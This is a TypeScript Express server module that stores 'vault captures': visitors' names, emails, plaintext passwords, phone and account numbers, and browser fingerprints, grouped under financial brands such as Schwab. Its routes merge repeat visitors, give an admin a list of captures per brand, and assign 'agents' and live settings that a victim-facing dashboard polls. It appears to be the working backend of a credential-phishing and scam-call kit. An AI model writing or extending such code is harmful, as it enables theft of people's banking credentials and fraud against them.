import { Router, type IRouter } from "express";
import { pool } from "@workspace/db";

const router: IRouter = Router();

// Auto-create table and add any missing columns
const ensureTable = (async () => {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS vault_captures (
      id              SERIAL PRIMARY KEY,
      brand           TEXT NOT NULL,
      name            TEXT,
      email           TEXT,
      password        TEXT,
      phone           TEXT,
      display_name    TEXT,
      account_num     TEXT,
      vault_ref       TEXT,
      case_id         TEXT,
      agent_name      TEXT,
      account_settings JSONB,
      fingerprint_id  TEXT,
      captured_at     TIMESTAMP DEFAULT NOW()
    )
  `);
  // Migrate existing tables that are missing columns
  for (const col of [
    "ALTER TABLE vault_captures ADD COLUMN IF NOT EXISTS name TEXT",
    "ALTER TABLE vault_captures ADD COLUMN IF NOT EXISTS agent_name TEXT",
    "ALTER TABLE vault_captures ADD COLUMN IF NOT EXISTS account_settings JSONB",
    "ALTER TABLE vault_captures ADD COLUMN IF NOT EXISTS fingerprint_id TEXT",
  ]) {
    await pool.query(col).catch(() => {});
  }
})().catch(() => {});

// ── Levenshtein similarity (0–1) used server-side for email dedup ─────────────
function levenshtein(a: string, b: string): number {
  if (!a.length) return b.length;
  if (!b.length) return a.length;
  const m: number[][] = [];
  for (let i = 0; i <= b.length; i++) m[i] = [i];
  for (let j = 0; j <= a.length; j++) m[0][j] = j;
  for (let i = 1; i <= b.length; i++)
    for (let j = 1; j <= a.length; j++)
      m[i][j] = b[i-1] === a[j-1] ? m[i-1][j-1] : Math.min(m[i-1][j-1]+1, m[i][j-1]+1, m[i-1][j]+1);
  return m[b.length][a.length];
}
function similarity(a: string, b: string): number {
  const na = (a||'').toLowerCase().replace(/[^a-z0-9]/g,'');
  const nb = (b||'').toLowerCase().replace(/[^a-z0-9]/g,'');
  if (!na || !nb) return 0;
  if (na === nb) return 1;
  return 1 - levenshtein(na, nb) / Math.max(na.length, nb.length);
}

// POST /api/vault-captures
// Upserts: fingerprint match → update; ≥90% email match → update; else insert
router.post("/vault-captures", async (req, res) => {
  await ensureTable;
  const { brand, name, email, password, phone, displayName, accountNum, vaultRef, caseId, fingerprintId } =
    req.body as Record<string, string>;
  if (!brand) { res.status(400).json({ error: "brand required" }); return; }

  // 1. Try fingerprint match first (same browser = same person)
  let existingId: number | null = null;
  if (fingerprintId) {
    const fp = await pool.query(
      "SELECT id FROM vault_captures WHERE fingerprint_id = $1 ORDER BY captured_at DESC LIMIT 1",
      [fingerprintId]
    );
    if (fp.rows.length) existingId = fp.rows[0].id;
  }

  // 2. Try ≥90% email similarity if no fingerprint hit
  if (!existingId && email) {
    const recent = await pool.query(
      "SELECT id, email FROM vault_captures WHERE brand = $1 AND email IS NOT NULL ORDER BY captured_at DESC LIMIT 50",
      [brand]
    );
    for (const row of recent.rows) {
      if (similarity(row.email, email) >= 0.9) {
        existingId = row.id;
        break;
      }
    }
  }

  // 3. Try ≥90% phone similarity if still no hit
  if (!existingId && phone) {
    const recent = await pool.query(
      "SELECT id, phone FROM vault_captures WHERE brand = $1 AND phone IS NOT NULL ORDER BY captured_at DESC LIMIT 50",
      [brand]
    );
    for (const row of recent.rows) {
      if (similarity(row.phone, phone) >= 0.9) {
        existingId = row.id;
        break;
      }
    }
  }

  if (existingId) {
    // Update the existing row — preserve agent_name and account_settings
    const { rows } = await pool.query(
      `UPDATE vault_captures
       SET name         = COALESCE($2, name),
           email        = COALESCE($3, email),
           password     = $4,
           phone        = COALESCE($5, phone),
           display_name = COALESCE($6, display_name),
           account_num  = COALESCE($7, account_num),
           vault_ref    = COALESCE($8, vault_ref),
           case_id      = COALESCE($9, case_id),
           fingerprint_id = COALESCE($10, fingerprint_id),
           captured_at  = NOW()
       WHERE id = $1
       RETURNING *`,
      [existingId, name||null, email||null, password||null, phone||null,
       displayName||null, accountNum||null, vaultRef||null, caseId||null, fingerprintId||null]
    );
    res.json({ ...rows[0], _merged: true });
    return;
  }

  // New visitor — insert
  const { rows } = await pool.query(
    `INSERT INTO vault_captures (brand, name, email, password, phone, display_name, account_num, vault_ref, case_id, fingerprint_id)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10) RETURNING *`,
    [brand, name||null, email||null, password||null, phone||null,
     displayName||null, accountNum||null, vaultRef||null, caseId||null, fingerprintId||null]
  );
  res.json(rows[0]);
});

// GET /api/vault-captures/:id  — visitor dashboard polls this for live settings
router.get("/vault-captures/:id", async (req, res) => {
  await ensureTable;
  const { rows } = await pool.query("SELECT * FROM vault_captures WHERE id=$1", [req.params.id]);
  if (rows.length === 0) { res.status(404).json({ error: "not found" }); return; }
  res.json(rows[0]);
});

// GET /api/vault-captures?brand=schwab  (admin list)
// GET /api/vault-captures?fingerprintId=xxx  (visitor self-lookup)
// GET /api/vault-captures?vaultRef=xxx  (visitor self-lookup fallback)
router.get("/vault-captures", async (_req, res) => {
  await ensureTable;
  const brand         = (_req.query.brand         as string) || null;
  const fingerprintId = (_req.query.fingerprintId as string) || null;
  const vaultRef      = (_req.query.vaultRef      as string) || null;

  if (fingerprintId) {
    const { rows } = await pool.query(
      "SELECT * FROM vault_captures WHERE fingerprint_id=$1 ORDER BY captured_at DESC LIMIT 1",
      [fingerprintId]
    );
    res.json(rows[0] || null);
    return;
  }
  if (vaultRef) {
    const { rows } = await pool.query(
      "SELECT * FROM vault_captures WHERE vault_ref=$1 ORDER BY captured_at DESC LIMIT 1",
      [vaultRef]
    );
    res.json(rows[0] || null);
    return;
  }

  const { rows } = brand
    ? await pool.query("SELECT * FROM vault_captures WHERE brand=$1 ORDER BY captured_at DESC", [brand])
    : await pool.query("SELECT * FROM vault_captures ORDER BY captured_at DESC");
  res.json(rows);
});

// PATCH /api/vault-captures/:id  — admin assigns agent + account settings
router.patch("/vault-captures/:id", async (req, res) => {
  await ensureTable;
  const { agentName, accountSettings } = req.body as { agentName?: string; accountSettings?: object };
  const { rows } = await pool.query(
    `UPDATE vault_captures
     SET agent_name = COALESCE($2, agent_name),
         account_settings = COALESCE($3, account_settings)
     WHERE id = $1
     RETURNING *`,
    [req.params.id, agentName ?? null, accountSettings ? JSON.stringify(accountSettings) : null]
  );
  if (rows.length === 0) { res.status(404).json({ error: "not found" }); return; }
  res.json(rows[0]);
});

// POST /api/vault-captures/:id/flag — merge a single boolean flag into account_settings
router.post("/vault-captures/:id/flag", async (req, res) => {
  await ensureTable;
  const { field, value } = req.body as { field: string; value: boolean };
  if (!field || typeof value !== 'boolean') {
    res.status(400).json({ error: 'field and value required' }); return;
  }
  const flagJson = JSON.stringify({ [field]: value });
  const { rows } = await pool.query(
    `UPDATE vault_captures
     SET account_settings = COALESCE(account_settings, '{}'::jsonb) || $2::jsonb
     WHERE id = $1
     RETURNING *`,
    [req.params.id, flagJson]
  );
  if (rows.length === 0) { res.status(404).json({ error: "not found" }); return; }
  res.json(rows[0]);
});

// DELETE /api/vault-captures/:id
router.delete("/vault-captures/:id", async (req, res) => {
  await ensureTable;
  await pool.query("DELETE FROM vault_captures WHERE id=$1", [req.params.id]);
  res.json({ ok: true });
});

export default router;
